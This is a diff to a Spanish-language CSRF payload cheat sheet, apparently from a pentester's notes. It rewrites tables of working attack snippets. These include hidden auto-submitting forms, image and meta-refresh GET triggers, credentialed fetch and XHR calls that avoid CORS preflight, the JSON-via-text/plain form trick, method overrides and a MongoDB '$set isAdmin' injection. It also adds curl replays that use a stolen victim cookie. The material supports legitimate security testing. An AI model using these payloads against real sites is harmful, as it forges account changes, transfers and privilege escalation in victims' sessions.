@@ -22,18 +22,14 @@ linked:
 
 ## HTML Form Auto-Submit (POST)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Form clásico POST | `<form action="https://target/profile" method="POST"><input name="email" value="evil@attacker.com"></form><script>document.forms[0].submit()</script>` | Auto-submit con JS. |
-| Sin JavaScript | `<body onload="document.forms[0].submit()"><form action="..." method="POST">...</form></body>` | Funcional con JS deshabilitado parcial. |
-| Multipart form-data | `<form action="..." method="POST" enctype="multipart/form-data">...</form>` | Para upload o avoid Content-Type checks. |
-| Form con múltiples inputs | `<input name="field1" value="..."><input name="field2" value="...">` | Replicar form completo. |
-| Form invisible | `<form style="display:none">...</form>` | UX silencioso. |
-| Iframe con form | `<iframe src="malicious.html" style="display:none"></iframe>` | Embed PoC en otro sitio. |
-| Form con action en target | `action="https://target.com/admin/delete"` | URL completa al target. |
-| Submit con button click | `<button type="submit">Click here</button>` | Para social engineering visible. |
-| Form en email HTML | Algunos clients permiten — peligroso | Outlook, Thunderbird. |
-| Force fixed value | `value="atacante@evil.com"` | Resultado determinístico. |
+| `<form action="https://target/profile" method="POST"><input name="email" value="evil@attacker.com"></form><script>document.forms[0].submit()</script>` | POST CSRF auto-submit con JS | Standard PoC. |
+| `<body onload="document.forms[0].submit()"><form action="..." method="POST">...</form></body>` | Auto-submit sin event handler | JS-light environments. |
+| `<form action="..." method="POST" enctype="multipart/form-data">...</form>` | POST con multipart (sin preflight CORS) | Bypass content-type strict. |
+| `<form style="display:none" action="..." method="POST">...</form>` con JS submit | UX silencioso (form invisible) | Stealth. |
+| `<iframe src="malicious.html" style="display:none"></iframe>` con form embedded | Embed PoC en otro sitio | Multi-page attack. |
+| `curl -X POST -b "session=$VICTIM_COOKIE" https://target/profile -d "email=evil"` (replay manual con cookie robada) | Verificar que endpoint acepta sin CSRF token | Pre-PoC validation. |
 ^csrf-vector-form
 
 ### PoC HTML completo
@@ -56,47 +52,33 @@ ___
 
 ## Image / Link (GET-based)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Image src GET | `<img src="https://target/api/delete?id=42">` | Fires GET inmediato sin user click. |
-| Hidden image | `<img src="..." style="display:none" width="0" height="0">` | Stealth. |
-| Link href | `<a href="https://target/transfer?to=attacker&amount=1000">Click</a>` | Requiere click. |
-| Link auto-click | `<script>location.href='https://target/...'</script>` | Top-level nav — pasa SameSite=Lax. |
-| Background image CSS | `<style>body{background:url(https://target/api/...)}</style>` | Igual que img. |
-| `<link rel>` | `<link rel="stylesheet" href="https://target/api/...">` | GET via stylesheet load. |
-| `<script src>` | `<script src="https://target/api/..."></script>` | GET via script load. |
-| `<video src>` / `<audio src>` | Same as img | Otros tags con GET. |
-| `<iframe src>` | `<iframe src="https://target/api/...">` | GET en frame. |
-| Meta refresh | `<meta http-equiv="refresh" content="0;url=https://target/...">` | Top-level navigation. |
-| Auto-fetch via JS | `fetch('https://target/api/...')` | Sin CORS — pero credentials no enviadas por default. |
-| Beacon API | `navigator.sendBeacon('https://target/...')` | Async, no response. |
+| `<img src="https://target/api/delete?id=42">` | GET fired automáticamente sin click | Endpoint write con GET (anti-pattern). |
+| `<img src="..." style="display:none" width="0" height="0">` | Hidden image — stealth | Silent attack. |
+| `<a href="https://target/transfer?to=attacker&amount=1000">Click</a>` | Requires click — para social eng | Visible vector. |
+| `<script>location.href='https://target/...'</script>` | Top-level navigation — pasa SameSite=Lax | SameSite Lax bypass. |
+| `<style>body{background:url(https://target/api/...)}</style>` | GET via CSS background | Same effect que img. |
+| `<link rel="stylesheet" href="https://target/api/...">` | GET via stylesheet load | CSS-injection chains. |
+| `<script src="https://target/api/..."></script>` | GET via script load | Endpoint que ejecuta GET state-change. |
+| `<iframe src="https://target/api/...">` | GET en frame | iframe-based. |
+| `<meta http-equiv="refresh" content="0;url=https://target/...">` | Top-level redirect | Bypass SameSite Lax. |
+| `<video src="https://target/api/...">` o `<audio src="...">` | GET via media tags | Otros tags con GET. |
 ^csrf-vector-image
-
-### CSRF GET-based PoC
-
-```html
-<!-- Attack en página atacante visitada por victim -->
-<img src="https://target.com/api/transfer?to=attacker&amount=1000" style="display:none">
-```
-
-Si endpoint POST está marcado pero acepta GET → `<img>` ejecuta. Anti-pattern común.
 
 ___
 
 ## JavaScript fetch / XHR
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| fetch básico con cookies | `fetch('https://target/api/x', {method:'POST', credentials:'include', body:'...', headers:{...}})` | `credentials:'include'` envía cookies. |
-| XHR clásico | `var x=new XMLHttpRequest(); x.open('POST','...'); x.withCredentials=true; x.send(body);` | Pre-fetch API. |
-| fetch con JSON | `fetch('...', {method:'POST', credentials:'include', headers:{'Content-Type':'application/json'}, body:JSON.stringify({...})})` | Application/json — preflight required. |
-| fetch sin preflight (simple request) | `Content-Type: application/x-www-form-urlencoded` o `text/plain` o `multipart/form-data` | Bypass de CORS preflight. |
-| fetch con custom header | `headers:{'X-Custom':'x'}` → triggers preflight | Limitación. |
-| Background fetch | `fetch('...', {keepalive:true})` | Survives page unload. |
-| Sendbeacon | `navigator.sendBeacon(url, body)` | Body como string/Blob/FormData. |
-| Form-encoded body via fetch | `body:new URLSearchParams({k:'v'})` | Sin preflight. |
-| Multipart body via fetch | `body:new FormData(form)` | Sin preflight. |
-| WebSocket "fetch" | `new WebSocket('wss://target/...')` | CSWSH vector. |
+| `fetch('https://target/api/x', {method:'POST', credentials:'include', body:'k=v', headers:{'Content-Type':'application/x-www-form-urlencoded'}})` | POST con cookies + sin preflight | CORS simple request. |
+| `fetch('https://target/api/x', {method:'POST', credentials:'include', body:JSON.stringify({...}), headers:{'Content-Type':'application/json'}})` | POST JSON (con preflight) | Solo si CORS allow origin. |
+| `fetch('https://target/api/x', {method:'POST', credentials:'include', body:new FormData(form)})` | POST multipart sin preflight | Bypass content-type check. |
+| `fetch('https://target/api/x', {method:'POST', credentials:'include', body:new URLSearchParams({k:'v'}), keepalive:true})` | Survives page unload | Long-running page. |
+| `navigator.sendBeacon('https://target/...', new Blob([body],{type:'application/json'}))` | Async send, no preflight | Beacon API. |
+| `var x=new XMLHttpRequest(); x.open('POST','https://target/api/x'); x.withCredentials=true; x.send('k=v')` | XHR clásico con cookies | Pre-fetch fallback. |
+| `new WebSocket('wss://target/...')` desde origen atacante (sin Origin check server-side) | CSWSH (CSRF on WebSocket) | WS sin origin validation. |
 ^csrf-vector-fetch
 
 ### fetch sin preflight (CORS simple request)
@@ -106,30 +88,25 @@ fetch('https://target.com/api/transfer', {
   method: 'POST',
   credentials: 'include',
   headers: {
-    'Content-Type': 'application/x-www-form-urlencoded'  // simple request
+    'Content-Type': 'application/x-www-form-urlencoded'  // simple request — no preflight
   },
   body: 'to=attacker&amount=1000'
 });
 ```
 
-Sin preflight OPTIONS → backend recibe POST con cookies. Si no hay token CSRF check → success.
-
 ___
 
 ## JSON / Multipart Content-Type Bypass
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| API espera JSON pero acepta form | Form con `Content-Type: application/x-www-form-urlencoded` y body que parsea como JSON | Si lib hace fallback a form parser. |
-| API JSON con form body | `<form enctype="text/plain"><input name='{"key":"val","_":' value='_"}'>` | Trick CSRF JSON via form `text/plain`. |
-| Trick text/plain JSON | `<form enctype="text/plain" action="https://target/api"><input name='{"action":"delete","_":' value='_"}'></form>` | Form genera `{"action":"delete","_":=_"}` body — JSON válido. |
-| API XML con form | Igual concept — aceptar `application/xml` con form-encoded data | Edge case. |
-| API que acepta múltiples Content-Types | `Content-Type: application/json` rejected, pero `text/plain` con JSON adentro acepta | Sniffing-based parser. |
-| Multipart con custom boundary | `<form enctype="multipart/form-data">...</form>` | Para uploads — no requiere preflight. |
-| Method override via header | `X-HTTP-Method-Override: PUT` con form POST | Backend convierte. |
-| Method override via body | `_method=PUT` campo hidden | Rails / Symfony default behavior. |
-| Method override via query | `?_method=DELETE` | Igual. |
-| API REST con JSON-only | Si API requiere `Content-Type: application/json` strict y app no acepta otros | Más resistente. |
+| `<form enctype="text/plain" action="https://target/api"><input name='{"action":"delete","_":' value='_"}'></form>` | Form genera body JSON parseable cross-origin | API JSON tolerante a content-type. |
+| `<form enctype="multipart/form-data" action="https://target/api">...</form>` | Multipart sin preflight | API que acepta multipart. |
+| `<form enctype="application/x-www-form-urlencoded" action="https://target/api/json"><input name="action" value="delete"></form>` | Form-encoded para API JSON | Backend con dual parser fallback. |
+| `<input name="_method" value="PUT">` en form POST | Method override via body | Rails / Symfony. |
+| `<form action="https://target/api?_method=DELETE">` | Method override via query | Same idea. |
+| `<form enctype="text/plain"><input name='{"$set":{"isAdmin":true},"_":' value='_"}'>` | MongoDB operator inject + JSON CSRF | NoSQL backend. |
+| `curl -X POST https://target/api -H "X-HTTP-Method-Override: PUT" -d 'k=v'` (verificar que método override funciona) | Pre-PoC method override probe | Probe antes del PoC. |
 ^csrf-vector-json
 
 ### CSRF JSON via text/plain trick
@@ -146,6 +123,6 @@ ___
 </html>
 ```
 
-Browser envía body literal: `{"email":"attacker@evil.com","_dummy":"=" }`. Backend que parsea JSON con tolerancia → procesa el email change.
+Body literal enviado: `{"email":"attacker@evil.com","_dummy":"=" }`. Backend con JSON parser tolerante → email cambiado.
 
 ***
